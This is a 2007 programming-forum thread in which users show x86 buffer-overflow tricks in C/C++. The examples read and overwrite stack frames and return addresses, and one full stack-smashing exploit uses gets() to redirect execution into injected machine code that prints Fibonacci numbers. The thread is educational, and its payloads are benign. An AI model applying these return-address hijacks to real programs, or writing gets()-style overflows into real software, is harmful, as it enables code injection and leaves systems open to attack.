---
title: "Having fun with buffer overflow..."
date: 2007-01-28
forum: Programming Talk
---

### Post by Wybiral on 2007-01-28
I've been playing around in C++ with some weird uses for buffer overflow recently and thought I'd post them here to show other people a couple of things..

1. Why writing outside of an arrays boundaries is VERY BAD
2. How you can use this in your programs to alter the stack.

The first one's a simple one... We are going to retrieve a variable passed to a function without using it's label... How? By reading past an array's boundaries...

```

#include <iostream>

using namespace std;

void func(char x)
{
   char a[1];
   cout << a[9];
}

int main()
{
   func('H');
   func('e');
   func('l');
   func('l');
   func('o');
   func('\n');
}

```

Interesting? Well, if you have a basic knowledge of assembly it should make perfect sense... When a function is called with parameters, the stack looks like this:
[allocated space for function][ebp][return address][parameters]
So, when one of the allocated arrays is used as a base, then you can see what kind of stuff you're looking at if you read a little further... Pretty neat if you ask me!

Here's an example that actually modifies a variable outside of the function scope through a reference...

```

#include <iostream>

using namespace std;

void func(int& x)
{
   int a[1];
   a[11]=666;
}

int main()
{
   int  x;
   x = 5;
   func(x);
   cout<<x<<endl;
}

```

But you though the value of "x" was 5? Not 666?

This one combines the use of those first two example to assign the value of a referenced variable to one of the function parameters... All without using the intended labels.

```

#include <iostream>

using namespace std;

void func(int& A, int B)
{
   int a[1];
   a[11] = a[4];
}

int main()
{
   int  x;
   x = 5;
   func(x, 666);
   cout<<x<<endl;
}

```

Aren't buffer overflows neat?

Also, off topic, here's a little machine code dynamically executed in a C program...

```

#define shellcode\
   "j\nj!jdjljrjojwj jojljljejHU"\
   "\x89\xe5\x81\xc4\x04\x00\x00"\
   "\x00\xb8\x04\x00\x00\x00\xbb"\
   "\x01\x00\x00\x00\x89\xe1\xba"\
   "\x34\x00\x00\x00\xcd\x80\xb8"\
   "\x01\x00\x00\x00\xcd\x80\x00"

int main(void)
{
   ((void(*)())shellcode)();
}

```

In case you're wondering, without the use of printf, that program writes "Hello world!\n" to the console. BTW, the letter "j" in machine code is "push byte" so, 'jH' pushed the byte 'H' onto the stack... In that machine code, the stack is used to store the string "Hello world!\n" then the syscall for write is used to display it.

Anyway... All of this is just for fun. Obviously it's a little risky to use in a serious program, but it's still interesting to know how C/C++ actually do things behind the scenes.

BTW... Execute these at your own risk! They should be OK, but different compiler flags and different compilers could cause differences in byte spacing for the function call stacks... Which would ruin the program. However, the worst you should get is a segfault error.

---

### Post by yabbadabbadont on 2007-01-28
Way back in the dark ages, I once cut the size of an IBM360 assembler program in half by having it modify itself by rewriting the object code on the fly.  It really pissed off the instructor of the class.  It annoyed him even more when I pointed out that I hadn't used any instructions that had not yet been covered in class.  (That was a pet peeve of his)  Plus, I was bored out of my mind.  Most of the people in that class should never have been there, and the pace of the class suffered for it.

By the way, your explanation of the organization of the stack depends on the architecture of the machine (x86 from your example), and the calling conventions used by the particular language in which you are programming.  Still, it is a pretty good overview for beginners.

---

### Post by jblebrun on 2007-01-29
> **Wybiral said:**
> I've been playing around in C++ with some weird uses for buffer overflow 


That's a nice demonstration to explain buffer overflow exploits to those who aren't familiar with how they come about! Good job!

---

### Post by jblebrun on 2007-01-29
> **yabbadabbadont said:**
> Way back in the dark ages, I once cut the size of an IBM360 assembler program in half by having it modify itself by rewriting the object code on the fly.  It really pissed off the instructor of the class.  It annoyed him even more when I pointed out that I hadn't used any instructions that had not yet been covered in class.  (That was a pet peeve of his)  Plus, I was bored out of my mind.  Most of the people in that class should never have been there, and the pace of the class suffered for it.

By the way, your explanation of the organization of the stack depends on the architecture of the machine (x86 from your example), and the calling conventions used by the particular language in which you are programming.  Still, it is a pretty good overview for beginners.

Oh man, I feel you! I hate professors like that. In the fourth grade, my best friend and i were so bored, we'd go back through the addition worksheets and re-work the problems as multiplication. Our teacher would get SO pissed off, and actually called our parents in for a conference, claiming we were snotty show-offs. Needless to say, our parents weren't very supportive of this claim!

People like that should not be in the education field.

---

### Post by Lux Perpetua on 2007-01-29
> **Wybiral said:**
> 
Also, off topic, here's a little machine code dynamically executed in a C program...

```

#define shellcode\
   "j\nj!jdjljrjojwj jojljljejHU"\
   "\x89\xe5\x81\xc4\x04\x00\x00"\
   "\x00\xb8\x04\x00\x00\x00\xbb"\
   "\x01\x00\x00\x00\x89\xe1\xba"\
   "\x34\x00\x00\x00\xcd\x80\xb8"\
   "\x01\x00\x00\x00\xcd\x80\x00"

int main(void)
{
   ((void(*)())shellcode)();
}

```

In case you're wondering, without the use of printf, that program writes "Hello world!\n" to the console. BTW, the letter "j" in machine code is "push byte" so, 'jH' pushed the byte 'H' onto the stack... In that machine code, the stack is used to store the string "Hello world!\n" then the syscall for write is used to display it.I'll try that when I get home. (I'm not really in the mood to try it on this SPARC machine...:-))

---

### Post by Wybiral on 2007-01-29
Oh yes... It is x86 assembly. As yabbadabbadont mentioned, all of these were tested on an x86 machine, and are likely not to work without some alteration on other machines.

The shellcode one can actually be replaced with any assembly... Just grab an assembler, write up a program... Assemble it... Then copy and paste the hex values from a hexdump/hex editor. You'll only want the PROGRAM, not the elf header... The program entry is a 4-byte value in the elf header starting at byte 25 which tells you the exact address of the program entry (in case you're curious). Naturally since it's in a string you will have to put "\x" to tell it that it's a hex value and not the actual characters. The first row in that assembly IS actual characters...

'j'=0x6a="push $byte"
'U'=0x55="push %ebp"

The rest of them are themselves (as I mentioned, we were pushing bytes to the stack to create a string). If you cut & pasted an elf executable header into a hex-editor, you could actually paste those after the header to create an executable. Just remember to change the program size in the elf header.

Here's another buffer overflow that alters the return address of a function...

```

#include <iostream>

using namespace std;

void func(int A)
{
   int a[1];
   cout << a[3];
   a[2] += 7;
}

int main()
{
   int  x;
   x = 5;
   func(x);
   x = 666;
   cout << endl << x << endl;
}

```

Notice how "666" is never assigned to x. Pretty neat if you ask me!
That last example was interesting, because if you embed some machinecode in a program (like the hello world program above^). You can find it's address and actually reroute the program to jump there after the function call... Strange things these buffer overflows...

---

### Post by lnostdal on 2007-01-29
..kinda related to this, i once used a somewhat "interesting" (or stupid) method to generate substrings by manipulating the buffer itself:
  [http://nostdal.org/~lars/programming/c/subStr.c](http://nostdal.org/~lars/programming/c/subStr.c)

it provides a sort of adhoc automatic extent/memory management by enabling the user to specify a pointer to a function for it to call with the generated substring - this internal caller is thus the one responsible for managing memory

other stupid/interesting hacks: [http://nostdal.org/~lars/programming/c/vector-and-vector-segment.c](http://nostdal.org/~lars/programming/c/vector-and-vector-segment.c)
2D vectors/table: [http://nostdal.org/~lars/programming/c/table.c](http://nostdal.org/~lars/programming/c/table.c)

(probably not complete/safe/sane any of these .. just weird stuff hacked togheter for fun :))

---

### Post by dannyboy79 on 2007-01-29
> **lnostdal said:**
> ..kinda related to this, i once used a somewhat "interesting" (or stupid) method to generate substrings by manipulating the buffer itself:
  [http://nostdal.org/~lars/programming/c/subStr.c](http://nostdal.org/~lars/programming/c/subStr.c)

it provides a sort of adhoc automatic extent/memory management by enabling the user to specify a pointer to a function for it to call with the generated substring - this internal caller is thus the one responsible for managing memory

other stupid/interesting hacks: [http://nostdal.org/~lars/programming/c/vector-and-vector-segment.c](http://nostdal.org/~lars/programming/c/vector-and-vector-segment.c)
2D vectors/table: [http://nostdal.org/~lars/programming/c/table.c](http://nostdal.org/~lars/programming/c/table.c)

(probably not complete/safe/sane any of these .. just weird stuff hacked togheter for fun :))

huh?

---

### Post by Wybiral on 2007-01-29
> **lnostdal said:**
> (probably not complete/safe/sane any of these .. just weird stuff hacked togheter for fun :))

Indeed. Playing with buffer overflow isn't the safest and certainly isn't the most portable... Hell, it isn't even much of an advantage in most cases. So it certainly isn't something you would want to use in a serious project...

BUT... it is a lot of fun to play with and it does give you a better understanding of how your language creates functions in machine code, things like:

1. how parameters are sent to the function
2. how values are returned from the function
3. how the function returns to it's previous location
4. how function-scope space is allocated

While also teaching you exactly why it's bad to write outside of an allocated array, instead of just being told that it's bad.

So, while it's basically useless to implement in a serious project (unless you're up to no good) it's still worth playing around with and gaining some reasoning behind your languages workings.

---

### Post by lnostdal on 2007-01-29
> **dannyboy79 said:**
> huh?

huh - what? .. you know - having fun with the buffer, playing with your dodo? lol :)

edit:
wybiral: the stuff i posted isn't really overflows .. but it's pretty close on the "stuff you generally don't want to do with buffers"-scale while still being kind of interesting/related so i figured i'd post it :)

---

### Post by Lux Perpetua on 2007-01-29
> **Lux Perpetua said:**
> I'll try that when I get home. (I'm not really in the mood to try it on this SPARC machine...:-))Okay, behavior confirmed. Nice work, Wybiral.

I'm going to try to come up with another example. I'll post here if I come up with anything.

---

### Post by Wybiral on 2007-01-29
Thanks.

BTW, if you have a decent knowledge of C and assembly, the best way to study these things it to compile your C programs with the "-S" flag and check out what it does at the assembly level. It's pretty obvious when you see how the memory is allocated in the stack.

---

### Post by xtacocorex on 2007-01-29
Funny story about out of bounds array calls.

I was working on a code for my Computational Fluid Dynamics course on the 1 dimensional Euler equation (in FORTRAN of course) and ended up with it calling an array out of bounds, ran the code and it worked.  Finding this odd, I go in and fix it to use the right bounds and the code seg faults and quits.  I did this process about 5 times and just figured that I'd keep the error since it worked.  

Some of my classmates got stuck at the same part and couldn't get their code, or my algorithm, to work in their programs. It felt good to do well on the program, but to this day, it still bugs me that I haven't been able to figure out why the out of bounds worked and the proper method didn't.

Wybiral, I do like your random tid-bits of code you post in here.  This programming sub-forum is the only thing that keeps me coming to the forums.

---

### Post by Wybiral on 2007-01-29
Ok, here's another one... This time we're executing the hello world program, via embedded machine code, by changing the return address of the function call to the address that the machine code starts.

You CAN NOT have any optimization flags on when you compile this because it's very position dependent.

```

const char* shellcode=
   "j\nj!jdjljrjojwj jojljljejHU"\
   "\x89\xe5\x81\xc4\x04\x00\x00"\
   "\x00\xb8\x04\x00\x00\x00\xbb"\
   "\x01\x00\x00\x00\x89\xe1\xba"\
   "\x34\x00\x00\x00\xcd\x80\xb8"\
   "\x01\x00\x00\x00\xcd\x80\x00";

void func()
{
   int a[1];
   a[2] = 0x080484CC;
}

int main()
{
   func();
}

```

As a little insight... Programs on the x86 machine are loaded into the address "0x08048000"

So, if you know the offset of a function or the embedded machine code such as in this example, you just add that to the address "0x08048000" and that's where you need to redirect your function. A good hex editor should help you find all of this. Just set it to 0 or something when you first compile, open it up with a hex editor and find the correct address and then put that in instead of 0.

---

### Post by yabbadabbadont on 2007-01-30
> **xtacocorex said:**
> Funny story about out of bounds array calls.

I was working on a code for my Computational Fluid Dynamics course on the 1 dimensional Euler equation (in FORTRAN of course) and ended up with it calling an array out of bounds, ran the code and it worked.  Finding this odd, I go in and fix it to use the right bounds and the code seg faults and quits.  I did this process about 5 times and just figured that I'd keep the error since it worked.  

Some of my classmates got stuck at the same part and couldn't get their code, or my algorithm, to work in their programs. It felt good to do well on the program, but to this day, it still bugs me that I haven't been able to figure out why the out of bounds worked and the proper method didn't.

Wybiral, I do like your random tid-bits of code you post in here.  This programming sub-forum is the only thing that keeps me coming to the forums.

Without seeing the code it would be hard to diagnose...  However, a common mistake in Fortran programming is assuming that arrays are stored in row major order (like C, etc) when they are stored in column major order.

---

### Post by Lux Perpetua on 2007-01-31
Okay, here's a slightly less trivial installment in "fun with buffer overflows." Like the preceding examples, this is completely specific to the x86 architecture because it's what I have. It combines two of the themes developed so far in this thread: (1) buffer overflows and (2) dynamic code execution. What gave me the most difficulty was that I didn't realize that the executable would be taken apart into sections, each of which would be loaded to its own address; i. e., the whole thing isn't just dumped into memory as-is. The ELF header actually specifies where each section is put (text, data, etc.). Since I didn't know that, I was actually sending the program off to execute code at the incorrect address, leading to undesirable results (!). 

First, the C program: ```
[font="Courier New"]#include <stdio.h>

char buf[80] = "Hello, friend.";

void process(void) {
    char str[8];
    gets(str);
    fgets(buf, 80, stdin);
}


int main(int argc, char **argv)
{
    process();
    return 0;
}[/font]
```Compile this program with > gcc program.cI have gcc 4.0.3, and I wouldn't be surprised if it didn't work with other versions. (It should work anyway with minor modifications, but it would take a bit of doing to make those modifications.) For input to this program, make a file with the following data. What I'm showing you is a hex dump of a binary file; you can't just cut and paste this text into a text editor. You could use a hex editor or a script to create the binary file from the hex dump. The bytes I've colored red are explained below. ```
[font="Courier New"]20 20 20 20 20 20 20 20 20 20 20 20 [color=red]20 96 04 08[/color]
0a 89 e5 31 db 43 31 ff 47 31 f6 eb 21 31 c9 b1
05 01 c9 66 51 31 d2 f7 f1 80 c2 30 66 52 85 c0
75 f3 31 c0 b0 04 89 e1 89 ea 29 ca cd 80 89 ec
01 f7 89 f8 87 f7 71 d5 31 c0 40 31 db cd 80 0a[/font]
```Save this to a file, say "input". Then run the program: > a.out < inputIt's supposed to print out all the positive Fibonacci numbers that fit into a 32-bit signed integer. If you get a segfault or something else, then it's probably just that the array `buf' isn't the same place it is in my compiled program. (**Edit:** or not. See post #20.) The four bytes I've colored red in the input file have to be the address of the array buf, *in reverse (little-endian) order* (so for me, the array is at address 0x08049620). The easiest method I can explain to determine this address is simply to look at the value of buf in a debugger.

I can't say more tonight, but I'll explain the mechanics of this when I get the chance. (Or better yet, someone else can do it.)

---

### Post by kvorion on 2007-01-31
Do the output of the programs differ with operating systems? I am currently running winxp and I tried these programs on a windows port of gcc (Bloodshed Dev-C++). The programs did not work as expected.

---

### Post by Wybiral on 2007-01-31
> **kvorion said:**
> Do the output of the programs differ with operating systems? I am currently running winxp and I tried these programs on a windows port of gcc (Bloodshed Dev-C++). The programs did not work as expected.

Yes since the executable format is different they will most likely behave different.

---

### Post by Lux Perpetua on 2007-01-31
> **kvorion said:**
> Do the output of the programs differ with operating systems? I am currently running winxp and I tried these programs on a windows port of gcc (Bloodshed Dev-C++). The programs did not work as expected.Yes, I'm sorry, I forgot to mention that. It will definitely not work on Windows. The reason is that my machine code uses the interrupt instruction (INT) to produce output using syscalls, and Linux and Windows use different protocols for system calls. (You can see two instances of "CD 80" in my hex dump. That's the instruction INT 0X80, which is the Linux catch-all for system calls. The two instances are respectively a call to "write" and a call to "exit.") In fact, even different Unix systems use different kernel calling conventions, so my example is really valid *only for Linux*. But hopefully most of us are running Linux anyway...

That said, this example can probably be ported to other x86 operating systems by modifying the input file. However, the modification would be nontrivial, and you'd have to make sure your Fibonacci program didn't grow past 79 bytes to fit into buf.

---

### Post by Lux Perpetua on 2007-01-31
**Update on my submission above:**  I tried it on my computer with gcc 3.3 and gcc 3.4. They worked, but I did have to modify the four bytes of the input file as described below. I also tried this example on a different computer (x86-compatible, CentOS) with no luck at all. It seems the computer refused to execute the "data" section, and it refused to modify the "read-only data" section. Damn it...it's just...so...reasonable! I was very disappointed. I don't know how to remedy that without hacking the ELF file itself, which of course would make the whole exercise pointless. 

So you may or may not have any luck with my code. Anyway, here's a brief explanation of the mechanics of my buffer overflow. For easy reference, here's my code again: ```
#include <stdio.h>

char buf[80] = "Hello, friend.";

void process(void) {
    char str[8];
    gets(str);
    fgets(buf, 80, stdin);
}


int main(int argc, char **argv)
{
    process();
    return 0;
}
```Here's the input file, color-coded:```
[color=green]20 20 20 20 20 20 20 20 20 20 20 20[/color] [color=red]20 96 04 08[/color]
[color=blue]0a[/color] [color=black]89 e5 31 db 43 31 ff 47 31 f6 eb 21 31 c9 b1
05 01 c9 66 51 31 d2 f7 f1 80 c2 30 66 52 85 c0
75 f3 31 c0 b0 04 89 e1 89 ea 29 ca cd 80 89 ec
01 f7 89 f8 87 f7 71 d5 31 c0 40 31 db cd 80[/color] [color=blue]0a[/color]
```What the colors mean:[list][*][color=blue]blue[/color]: these are newline characters (0x0A). gets and fgets stop reading at end-of-line, so these are just used to delimit the input. The stuff before the first 0a is read by gets, and the stuff after the first 0a up to and including the second 0a is read by fgets. (This one is technically unnecessary, since fgets also stops reading at end-of-file.) [*][color=green]green[/color]: as mentioned above, this is read by gets in the function process(). There are actually twelve characters here being read into an 8-character buffer. Hmmm. I actually don't care what gets written here, so I put twelve space characters (0x20). [*][color=red]red[/color]: this is also read by gets and is written 12 bytes after the beginning of the buffer, taking up bytes 4-7 after its end. This is a very important place: it's the place on the stack where the processor stores the memory address of the code the function will return to after completing execution. We're using the wonderful buffer overflow capabilities of gets to overwrite the return address with the address we choose. We're eventually going to want to execute code located at the global array buf, so make sure that the four bytes here match the address of buf. I mentioned before that you could simply view the address in a debugger, but the fastest way I know to do this is to run the command > readelf -x .data a.out You should see the string "Hello, friend." on the right, and the same string in hexadecimal ASCII code on the left. (By the way, for some reason unknown to me, the hex display is *mirrored* to read right-to-left.) You can read off the memory address of this string directly in the left margin. For me, the string started at address 0x08049620, and the corresponding bytes (in little-endian order) appear in my input file. [*][color=black]black[/color]: these 62 bytes are read by fgets into the global array buf. These bytes are actually machine code for a program that prints out the Fibonacci numbers. (As I said above, it will only work in Linux.) [/list]Putting it together: after process() is done reading my input file, buf[] contains code that prints out the Fibonacci numbers, and process() is all set up to "return" to the beginning of buf[]. When the function then returns, if we're lucky, the program jumps to the array buf[] and happily executes our code. 

If you want to try it out, you can use the following program to "assemble" a hexdump into a binary file.  
```
#include <iostream>
#include <fstream>

using namespace std;

int main(int argc, char **argv) {
  if (argc < 2) {
    cerr << "Usage: " << argv[0] << "binary_file_name" << endl;
    return 1;
  }
  ofstream outf(argv[1], ios::binary|ios::trunc);
  if (!outf) {
    cerr << "Couldn't open " << argv[1] << " for writing" << endl;
    return 1;
  }
  unsigned int d;
  while (cin >> hex >> d) {
    if (d >> 8) {
      cerr << "Invalid byte " << hex << d
	   << " specified (ignoring)" << endl;
      continue;
    }
    char c = d;
    outf.write(&c, 1);
  }
  return 0;
}
```Compile with > g++ hexassemble.cppIt expects a sequence of byte values in hexadecimal separated by whitespace. Just feed the hex dump of my input file (after your modifications, if applicable) into the standard input, and name the output file on the command line.

---

### Post by Wybiral on 2007-02-03
I'm back with more overflow misuse and information!

Here's the first one, this is kindof an overview of how the stack looks with a simple function call...
```

#include <iostream>

using namespace std;

void func(int a, int b)
{
   int test[0];
   cout<<test[0]<<endl; // EBP Register
   cout<<test[1]<<endl; // Return address
   cout<<test[2]<<endl; // Param a
   cout<<test[3]<<endl; // Param b
}

int main()
{
   func(100, 200);
}

```
There is no data to be allocated in this function, so the EBP register is first. Whats the EBP register doing there? That's a standard method to "set the stack" in assembly, and that's especially how C/C++ compilers handle functions, the first few lines of assembly in most C/C++ functions looks like this...
```

pushl %ebp
movl %esp, %ebp

```
Afterwards, had we allocated any space within the function (via function-scope variables/data) the amount of space would be subtracted from the ESP register and the function-scope memory would all be stored BEFORE the EBP register in the stack. We don't have to worry about all of this because our array is empty... In fact, non-existent... We're just using it as a frame of reference. But, if we did allocate any space within the function, EBP and the values after it, would be AFTER the allocated space.

The next four bytes (4 bytes = 1 integer) on the stack after EBP is the return address... How else does a function know where to jump back to? You can do some interesting stuff by changing this value... But that's not the point...

After the return address comes your function parameters. It's pretty straight forward.

Knowing that... This function allows you to jump a specified number of bytes...
```

#include <iostream>

using namespace std;

void skip(int a)
{
   int test[0];
   test[1] += test[2];
}

int main()
{
   int a=10;

   skip(4);
   a+=100;
   cout << a << endl;

   skip(4);
   a+=100;
   cout << a << endl;
}

```

Notice how "a" never increments...

Here, instead of jumping forward, we jump backward to create a sortof "for" loop...

```

#include <iostream>

using namespace std;

void skip(int a)
{
   int test[0];
   test[1] += test[2];
}

int main()
{
   int a=0;

   a++;
   if(a<100)
   {
      skip(-22);
   }

   cout << a << endl;
}

```

Here's the same program as above, except we're using our own condition function with buffer overflow...

```

#include <iostream>

using namespace std;

void cond(int a, int b)
{
   int test[0];
   if(test[2]>test[3])
   {
      test[1] += 12;
   }
}

void skip(int a)
{
   int test[0];
   test[1] += test[2];
}

int main()
{
   int a=0;

   a++;
   cond(a, 99);
   skip(-35);

   cout << a << endl;
}

```

Now we'll use buffer overflow to print the value...

```

#include <iostream>

using namespace std;

void cond(int a, int b)
{
   int test[0];
   if(test[2]>test[3])
   {
      test[1] += 12;
   }
}

void skip(int a)
{
   int test[0];
   test[1] += test[2];
}

void disp(int a)
{
   int test[0];
   cout << test[2] << endl;
}

int main()
{
   int a=0;

   a++;
   cond(a, 99);
   skip(-35);
   disp(a);
}

```

And, why not use buffer overflow to increment the value too!

```

#include <iostream>

using namespace std;

void cond(int a, int b)
{
   int test[0];
   if(test[2]>test[3])
   {
      test[1] += 12;
   }
}

void skip(int a)
{
   int test[0];
   test[1] += test[2];
}

void disp(int a)
{
   int test[0];
   cout << test[2] << endl;
}

void incr(int& a)
{
   int test[0];
   test[10]++;
}

int main()
{
   int a=0;
   incr(a);
   cond(a, 99);
   skip(-38);
   disp(a);
}

```

Interesting stuff if you ask me...

---

